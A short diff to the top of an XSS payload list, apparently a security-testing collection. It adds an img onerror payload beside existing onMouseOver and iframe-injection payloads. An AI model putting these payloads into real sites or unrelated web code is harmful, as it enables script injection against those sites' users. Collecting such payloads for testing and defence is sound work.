@@ -1,5 +1,6 @@
 "onMouseOver="alert(1);
 "><iframe src="https://jcw87.github.io/c2-smb1/" width="100%" height="600"></iframe>
+<img src='foo' onerror='console.log("Oi mano")' />
 <!-- Project Name  : Cross Site Scripting ( XSS ) Vulnerability Payload List -->
 <!--        Author : Ismail Tasdelen -->
 <!--      Linkedin : https://www.linkedin.com/in/ismailtasdelen/ -->
